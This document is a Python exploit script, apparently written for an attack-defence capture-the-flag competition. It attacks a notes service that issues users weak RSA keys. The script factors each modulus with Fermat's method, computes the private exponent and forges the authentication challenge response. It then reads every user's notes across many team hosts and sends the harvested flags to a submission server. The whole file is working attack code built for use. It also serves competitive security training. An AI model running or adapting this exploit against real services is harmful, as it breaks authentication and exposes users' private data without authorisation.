import requests
import math
import socket
import signal
import re
import threading


class timeout:
    def __init__(self, seconds=5):
        self.seconds = seconds
    def __call__(self, func):
        def _handler(sig, frame):
            raise TimeoutError()
        def wrapper(*args, **kwargs):
            signal.signal(signal.SIGALRM, _handler)
            signal.alarm(self.seconds)
            try: return func(*args, **kwargs)
            finally: signal.alarm(0)
        return wrapper

def submit_flags(flags: list[str], addr: str, port: int):
    flags = [f for f in flags if f is not None and f]
    if len(flags) < 1: return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((addr, port))
        payload = b'\n'.join(s.encode() for s in flags) + b'\n'
        sock.sendall(payload)
        lines = 0
        while lines < len(flags) + 3:
            x = sock.recv(1000)
            lines += x.count(b'\n')
        sock.close()
        print(f'[+] Flags submitted: {len(flags)}')
    except Exception as e:
        print(f'Error while sending flags: {e}')

@timeout(seconds=5)
def fermat_factor(n):
    a = math.isqrt(n)
    if a*a < n:
        a += 1
    while True:
        b2 = a*a - n
        b = math.isqrt(b2)
        if b*b == b2:
            return (a-b, a+b)
        a += 1

def extract_flag(s):
    m = re.search(r'RABA_[A-Za-z0-9+/]{32}', s)
    return m.group() if m else None

def get_user_ids(addr: str):
    res = requests.get(f'{addr}/users').json()
    if 'users' in res:
        return [el['id'] for el in res['users'] if 'id' in el]
    raise KeyError


def run_exploit(client_id):
    base_url = f'http://10.67.{client_id}.1:41203'
    print(f'[+] Running on: {base_url}')
    user_ids = get_user_ids(base_url)
    flags = []

    for uid in user_ids:
        try:
            user = requests.get(f'{base_url}/user/{uid}').json()
            if not 'pubkey' in user: continue

            pk = user['pubkey']
            e,n = pk['e'],pk['n']
            if n.bit_length() > 4096: 
                raise Exception(f'large n={n}!')

            challenge = requests.get(f'{base_url}/get_auth_challenge', json={
                'user_id': uid, 
                'pubkey': pk
            }).json()
            msg_hex = challenge['challenge_value']
            msg = int.from_bytes(bytes.fromhex(msg_hex))

            try: p,q = fermat_factor(n)
            except TimeoutError: continue

            tot = math.lcm(p-1, q-1)
            challenge['challenge_response'] = pow(msg, pow(e, -1, tot), n)

            all_notes = requests.get(f'{base_url}/readallnotes', json={
                'user_id': uid,
                'challenge': challenge,
            }).json()
            if all_notes and 'notes' in all_notes:
                for note in all_notes['notes']:
                    if 'content' in note:
                        if f := extract_flag(note['content']):
                            flags.append(f)
        except Exception as ex:
            print(f'[-] {uid} | Error: {ex}\n')

    return flags

if __name__ == '__main__':
    NUM_THREADS = 4

    all_ids = range(22)
    exclude = [3,4,5,11,14,13,22]
    ids = list(set(all_ids) - set(exclude))

    batches = [ids[i::NUM_THREADS] for i in range(NUM_THREADS)]

    all_flags = []
    lock = threading.Lock()

    def _worker(batch):
        for client_id in batch:
            flags = run_exploit(client_id)
            with lock: all_flags.extend(flags)

    threads = [threading.Thread(target=_worker, args=(batch,)) for batch in batches if batch]
    for t in threads: t.start()
    for t in threads: t.join()

    submit_flags(all_flags, '10.67.0.1', 31111)
